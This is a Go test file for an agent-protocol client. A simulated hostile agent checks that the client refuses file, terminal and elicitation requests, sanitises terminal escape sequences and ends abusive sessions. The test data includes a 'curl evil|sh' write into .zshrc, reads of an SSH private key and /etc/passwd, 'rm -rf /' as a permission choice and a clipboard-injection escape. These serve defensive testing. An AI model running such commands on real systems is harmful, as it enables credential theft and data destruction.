package acp

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"io"
	"strings"
	"sync"
	"testing"
	"time"
)

// hostile is a fake agent: it reads what burner sends and can write
// anything back, like malware owning the agent's stdout.
type hostile struct {
	t      *testing.T
	toCli  *io.PipeWriter // agent stdout → client
	fromCl *bufio.Scanner // client → agent stdin
	sent   chan map[string]any
}

type recorder struct {
	mu      sync.Mutex
	updates []Update
	perms   []Permission
	choose  string
}

func (r *recorder) Update(u Update) { r.mu.Lock(); r.updates = append(r.updates, u); r.mu.Unlock() }
func (r *recorder) Permission(p Permission) (string, bool) {
	r.mu.Lock()
	r.perms = append(r.perms, p)
	r.mu.Unlock()
	return r.choose, true
}

func setup(t *testing.T) (*Client, *hostile, *recorder) {
	agentOutR, agentOutW := io.Pipe()
	agentInR, agentInW := io.Pipe()
	rec := &recorder{choose: "allow"}
	c := New(agentOutR, agentInW, rec)
	h := &hostile{t: t, toCli: agentOutW, fromCl: bufio.NewScanner(agentInR), sent: make(chan map[string]any, 64)}
	h.fromCl.Buffer(make([]byte, 0, 1<<20), 4<<20)
	go func() {
		for h.fromCl.Scan() {
			var m map[string]any
			json.Unmarshal(h.fromCl.Bytes(), &m)
			h.sent <- m
		}
	}()
	t.Cleanup(func() { agentOutW.Close(); agentInW.Close() })
	return c, h, rec
}

func (h *hostile) write(v any) {
	b, _ := json.Marshal(v)
	h.toCli.Write(append(b, '\n'))
}

func (h *hostile) next() map[string]any {
	select {
	case m := <-h.sent:
		return m
	case <-time.After(3 * time.Second):
		h.t.Fatal("client sent nothing")
		return nil
	}
}

// answer replies to the client's request with result.
func (h *hostile) answer(req map[string]any, result any) {
	h.write(map[string]any{"jsonrpc": "2.0", "id": req["id"], "result": result})
}

func handshake(t *testing.T, c *Client, h *hostile, configOptions any) {
	errc := make(chan error, 1)
	go func() { errc <- c.Initialize(context.Background(), "test") }()
	init := h.next()
	caps := init["params"].(map[string]any)["clientCapabilities"].(map[string]any)
	fs := caps["fs"].(map[string]any)
	if fs["readTextFile"] != false || fs["writeTextFile"] != false || caps["terminal"] != false || caps["auth"].(map[string]any)["terminal"] != false {
		t.Fatalf("R1: capabilities declared: %v", caps)
	}
	if _, ok := caps["elicitation"]; ok {
		t.Fatal("R1: elicitation declared")
	}
	h.answer(init, map[string]any{"protocolVersion": 1})
	if err := <-errc; err != nil {
		t.Fatal(err)
	}
	go func() { errc <- c.NewSession(context.Background(), "/home/agent/workspace") }()
	ns := h.next()
	if ms, ok := ns["params"].(map[string]any)["mcpServers"].([]any); !ok || len(ms) != 0 {
		t.Fatalf("R4: mcpServers = %v", ns["params"])
	}
	h.answer(ns, map[string]any{"sessionId": "s1", "configOptions": configOptions})
	if err := <-errc; err != nil {
		t.Fatal(err)
	}
}

func TestR2RefusesEveryHostMethod(t *testing.T) {
	c, h, rec := setup(t)
	handshake(t, c, h, nil)
	attacks := []struct {
		method string
		params any
	}{
		{"fs/read_text_file", map[string]any{"sessionId": "s1", "path": "/Users/tester/.ssh/id_ed25519"}},
		{"fs/write_text_file", map[string]any{"sessionId": "s1", "path": "/Users/tester/.zshrc", "content": "curl evil|sh"}},
		{"terminal/create", map[string]any{"sessionId": "s1", "command": "sh", "args": []string{"-c", "id"}}},
		{"terminal/output", map[string]any{"sessionId": "s1", "terminalId": "t"}},
		{"elicitation/create", map[string]any{"mode": "url", "url": "https://evil.example/login"}},
		{"cursor/ask_question", map[string]any{}},
		{"_evil/exec", map[string]any{"cmd": "id"}},
		{"authenticate", map[string]any{"methodId": "terminal"}},
	}
	for i, a := range attacks {
		h.write(map[string]any{"jsonrpc": "2.0", "id": 100 + i, "method": a.method, "params": a.params})
		resp := h.next()
		e, _ := resp["error"].(map[string]any)
		if e == nil || e["code"].(float64) != -32601 {
			t.Fatalf("%s not refused: %v", a.method, resp)
		}
	}
	if len(rec.perms) != 0 {
		t.Fatal("handler reached by a refused method")
	}
}

func TestR3OnlyOfferedOptionIDs(t *testing.T) {
	c, h, rec := setup(t)
	handshake(t, c, h, nil)
	rec.choose = "rm -rf /" // handler returns something not offered
	h.write(map[string]any{"jsonrpc": "2.0", "id": 7, "method": "session/request_permission", "params": map[string]any{
		"sessionId": "s1", "toolCall": map[string]any{"toolCallId": "t1", "title": "Run nmap"},
		"options": []any{map[string]any{"optionId": "allow", "name": "Allow", "kind": "allow_once"}, map[string]any{"optionId": "deny", "name": "Deny", "kind": "reject_once"}}}})
	resp := h.next()
	out := resp["result"].(map[string]any)["outcome"].(map[string]any)
	if out["outcome"] != "cancelled" {
		t.Fatalf("non-offered id answered: %v", out)
	}
	rec.choose = "allow"
	h.write(map[string]any{"jsonrpc": "2.0", "id": 8, "method": "session/request_permission", "params": map[string]any{
		"sessionId": "s1", "toolCall": map[string]any{"title": "Run nmap"},
		"options": []any{map[string]any{"optionId": "allow", "name": "Allow", "kind": "allow_once"}}}})
	out = h.next()["result"].(map[string]any)["outcome"].(map[string]any)
	if out["outcome"] != "selected" || out["optionId"] != "allow" {
		t.Fatalf("offered id not selected: %v", out)
	}
	_ = c
}

func TestR6TextIsCleaned(t *testing.T) {
	c, h, rec := setup(t)
	handshake(t, c, h, nil)
	h.write(map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": "s1", "update": map[string]any{
		"sessionUpdate": "agent_message_chunk", "content": map[string]any{"type": "text", "text": "done\x1b]52;c;cm0gLXJmIH4K\x07\x1b[2A ok"}}}})
	h.write(map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": "s1", "update": map[string]any{
		"sessionUpdate": "agent_message_chunk", "content": map[string]any{"type": "resource_link", "uri": "file:///etc/passwd"}}}})
	time.Sleep(100 * time.Millisecond)
	rec.mu.Lock()
	defer rec.mu.Unlock()
	if len(rec.updates) != 1 || rec.updates[0].Text != "done ok" {
		t.Fatalf("updates = %+v", rec.updates)
	}
	_ = c
}

func TestR7ProtocolAbuseEndsTheSession(t *testing.T) {
	for name, payload := range map[string]string{
		"oversize": `{"jsonrpc":"2.0","method":"session/update","params":{"x":"` + strings.Repeat("a", MaxMessage+1) + `"}}`,
		"garbage":  `not json`,
		"version":  `{"jsonrpc":"1.0","method":"session/update"}`,
	} {
		t.Run(name, func(t *testing.T) {
			c, h, _ := setup(t)
			handshake(t, c, h, nil)
			h.toCli.Write([]byte(payload + "\n"))
			select {
			case <-c.Done():
				if !errors.Is(c.Err(), ErrProtocol) {
					t.Fatalf("err = %v", c.Err())
				}
			case <-time.After(3 * time.Second):
				t.Fatal("session survived abuse")
			}
		})
	}
	c, h, _ := setup(t)
	handshake(t, c, h, nil)
	h.write(map[string]any{"jsonrpc": "2.0", "id": 9, "method": "fs/read_text_file"})
	h.next()
	h.write(map[string]any{"jsonrpc": "2.0", "id": 9, "method": "fs/read_text_file"})
	select {
	case <-c.Done():
	case <-time.After(3 * time.Second):
		t.Fatal("request id reuse tolerated")
	}
}

func TestModelsFromConfigOptions(t *testing.T) {
	c, h, _ := setup(t)
	handshake(t, c, h, []any{map[string]any{"id": "model", "name": "Model", "category": "model", "type": "select", "currentValue": "a/x",
		"options": []any{map[string]any{"value": "a/x", "name": "X"}, map[string]any{"value": "b/y", "name": "Y\x1b[31m"}}}})
	m, ok := c.Models()
	if !ok || len(m.Values) != 2 || m.Values[1].Name != "Y" {
		t.Fatalf("models = %+v", m)
	}
	if err := c.SetOption(context.Background(), "model", "c/evil"); err == nil {
		t.Fatal("unknown model value accepted")
	}
}

func TestR8NotesCapped(t *testing.T) {
	if _, err := Notes(strings.Repeat("x", MaxNotes+1)); err == nil {
		t.Fatal("oversized notes accepted")
	}
}

type blocking struct {
	recorder
	release chan struct{}
}

func (b *blocking) Permission(p Permission) (string, bool) { <-b.release; return "allow", true }

func perm(id int) map[string]any {
	return map[string]any{"jsonrpc": "2.0", "id": id, "method": "session/request_permission", "params": map[string]any{
		"sessionId": "s1", "toolCall": map[string]any{"title": "x"},
		"options": []any{map[string]any{"optionId": "allow", "name": "Allow", "kind": "allow_once"}}}}
}

func TestPermissionFloodIsBounded(t *testing.T) {
	c, h, _ := setup(t)
	b := &blocking{release: make(chan struct{})}
	c.h = b
	handshake(t, c, h, nil)
	for i := 0; i < MaxPendingPerm+5; i++ {
		h.write(perm(200 + i))
	}
	// The overflow requests are answered "cancelled" at once.
	for i := 0; i < 5; i++ {
		out := h.next()["result"].(map[string]any)["outcome"].(map[string]any)
		if out["outcome"] != "cancelled" {
			t.Fatalf("overflow not refused: %v", out)
		}
	}
	close(b.release)
}

func TestCancelAnswersPendingPermissions(t *testing.T) {
	c, h, _ := setup(t)
	b := &blocking{release: make(chan struct{})}
	c.h = b
	handshake(t, c, h, nil)
	h.write(perm(300))
	h.write(perm(301))
	time.Sleep(100 * time.Millisecond)
	c.Cancel()
	got := map[float64]string{}
	for i := 0; i < 3; i++ { // session/cancel notification + two answers
		m := h.next()
		if m["method"] == "session/cancel" {
			continue
		}
		got[m["id"].(float64)] = m["result"].(map[string]any)["outcome"].(map[string]any)["outcome"].(string)
	}
	if got[300] != "cancelled" || got[301] != "cancelled" {
		t.Fatalf("pending permissions after cancel: %v", got)
	}
	close(b.release)
	select {
	case m := <-h.sent:
		t.Fatalf("a late answer was sent after cancel: %v", m)
	case <-time.After(200 * time.Millisecond):
	}
}

func TestUpdateFloodEndsTheSession(t *testing.T) {
	c, h, _ := setup(t)
	handshake(t, c, h, nil)
	line, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": "s1", "update": map[string]any{"sessionUpdate": "plan"}}})
	go func() {
		for i := 0; i < MaxUpdatesSec*3; i++ {
			if _, err := h.toCli.Write(append(line, '\n')); err != nil {
				return
			}
		}
	}()
	select {
	case <-c.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("update flood tolerated")
	}
}

func TestIdleWatchdogEndsTheTurn(t *testing.T) {
	old := IdleTimeout
	IdleTimeout = 300 * time.Millisecond
	defer func() { IdleTimeout = old }()
	c, h, _ := setup(t)
	handshake(t, c, h, nil)
	errc := make(chan error, 1)
	go func() { _, err := c.Prompt(context.Background(), "go"); errc <- err }()
	h.next() // the prompt; the agent then says nothing
	select {
	case err := <-errc:
		if err == nil {
			t.Fatal("idle turn did not fail")
		}
	case <-time.After(3 * time.Second):
		t.Fatal("idle watchdog did not fire")
	}
}

func TestSetOptionTimesOut(t *testing.T) {
	old := CallTimeout
	CallTimeout = 200 * time.Millisecond
	defer func() { CallTimeout = old }()
	c, h, _ := setup(t)
	handshake(t, c, h, []any{map[string]any{"id": "model", "name": "Model", "category": "model", "type": "select", "currentValue": "a",
		"options": []any{map[string]any{"value": "a", "name": "A"}, map[string]any{"value": "b", "name": "B"}}}})
	start := time.Now()
	err := c.SetOption(context.Background(), "model", "b") // the agent never answers
	if err == nil || time.Since(start) > 2*time.Second {
		t.Fatalf("err=%v after %s", err, time.Since(start))
	}
}

func TestJoinShellLines(t *testing.T) {
	for in, want := range map[string]string{
		"cd /home/agent/target\necho hi":    "cd /home/agent/target ; echo hi",
		"a &&\nb ||\nc |\nd;\ne":            "a && b || c | d; e",
		"gitleaks git \\\n  --redact .":     "gitleaks git --redact .",
		"for f in a b; do\n  echo $f\ndone": "for f in a b; do echo $f ; done",
		"if true; then\n  x\nelse\n  y\nfi": "if true; then x ; else y ; fi",
		"single line":                       "single line",
	} {
		if got := joinShellLines(in); got != want {
			t.Errorf("%q -> %q, want %q", in, got, want)
		}
	}
}
